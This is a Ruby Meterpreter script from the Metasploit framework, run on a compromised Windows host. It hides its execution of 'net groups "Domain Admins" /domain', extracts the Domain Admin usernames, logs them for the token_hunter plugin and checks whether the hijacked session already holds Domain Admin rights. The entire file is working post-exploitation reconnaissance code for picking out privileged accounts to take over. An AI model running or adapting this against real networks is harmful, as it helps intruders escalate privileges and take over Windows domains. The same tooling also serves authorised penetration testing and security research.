# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
#Options and Option Parsing
opts = Rex::Parser::Arguments.new(
  "-h" => [ false, "Help menu." ]
)

opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    print_line "Meterpreter Script for extracting Doamin Admin Account list for use."
    print_line "in token_hunter plugin and verifies if current account for session is"
    print_line "is a member of such group."
    print_line(opts.usage)
    raise Rex::Script::Completed
  end
}

def unsupported
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
#-------------------------------------------------------------------------------
#Set General Variables used in the script

@client = client
users = ""
list = []
host = @client.sys.config.sysinfo['Computer']
current_user = @client.sys.config.getuid.scan(/\S*\\(.*)/)

def reg_getvaldata(key,valname)
  value = nil
  begin
    root_key, base_key = @client.sys.registry.splitkey(key)
    open_key = @client.sys.registry.open_key(root_key, base_key, KEY_READ)
    v = open_key.query_value(valname)
    value = v.data
    open_key.close
  end
  return value
end

domain = reg_getvaldata("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","DefaultDomainName")
if domain == ""
  print_error("domain not found")
end

# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

unsupported if client.platform !~ /win32|win64/i

# Create a directory for the logs
logs = ::File.join(Msf::Config.log_directory, 'scripts','domain_admins')
# Create the log directory
::FileUtils.mkdir_p(logs)
#logfile name
dest = Rex::FileUtils.clean_path(logs + "/" + host + filenameinfo + ".txt")
print_status("found users will be saved to #{dest}")

################## MAIN ##################
#Run net command to enumerate users and verify that it ran successfully
cmd = 'net groups "Domain Admins" /domain'
r = @client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
while(d = r.channel.read)
  users << d
  if d=~/System error/
    print_error("Could not enumerate Domain Admins!")
    raise Rex::Script::Completed
  end
  break if d == ""
end
#split output in to lines
out_lines = users.split("\n")
#Select only those lines that have the usernames
a_size = (out_lines.length - 8)
domadmins = out_lines.slice(6,a_size)
#get only the usernames out of those lines
domainadmin_user_list = []
domadmins.each do |d|
  d.split("  ").compact.each do |s|
    domainadmin_user_list << s.strip if s.strip != "" and not s =~ /----/
  end
end
#process accounts found
print_status("Accounts Found:")
domainadmin_user_list.each do |u|
  print_status("\t#{domain}\\#{u}")
  file_local_write(dest, "#{domain}\\#{u}")
  list << u.downcase
end
if list.index(current_user.join.chomp.downcase)
  print_status("Current sessions running as #{domain}\\#{current_user.join.chomp} is a Domain Admin!!")
else
  print_error("Current session running as #{domain}\\#{current_user.join.chomp} is not running as Domain Admin")
end

